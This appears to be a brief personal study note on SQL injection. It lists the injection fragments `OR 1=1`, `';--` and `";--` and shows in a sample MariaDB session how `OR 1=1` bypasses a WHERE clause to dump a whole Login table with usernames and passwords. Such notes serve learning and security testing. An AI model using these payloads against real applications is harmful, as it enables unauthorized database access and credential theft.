
---

#### Key Queries to Use

> ```sql
> OR 1=1
> ```

>[!summary]- How to use
> This query segment will invalidate the conditions in the running queries.
> For example;
> ```sql
> MariaDB [Sample]> Select user_password from Login where User_name="admin";
> +---------------+
> | user_password |
> +---------------+
> | admin         |
> +---------------+
> 1 row in set (0.000 sec)
> ```
> 
> By adding `OR 1=1`, the `WHERE` statement will be invalidated and all entries in the column specified in `SELECT` statement will be selected. 
> If  `SELECT *` is used, then all data in the table will be selected.
> 
> ```sql
> MariaDB [Sample]> Select * from Login where User_name="admin" OR 1=1;
> +---------+-----------+---------------+
> | User_ID | User_name | User_password |
> +---------+-----------+---------------+
> |       1 | admin     | admin         |
> |       2 | daniel    | qwerty        |
> +---------+-----------+---------------+
> 2 rows in set (0.001 sec)
> ```

> ```sql
> ';--
> ";--
> ```
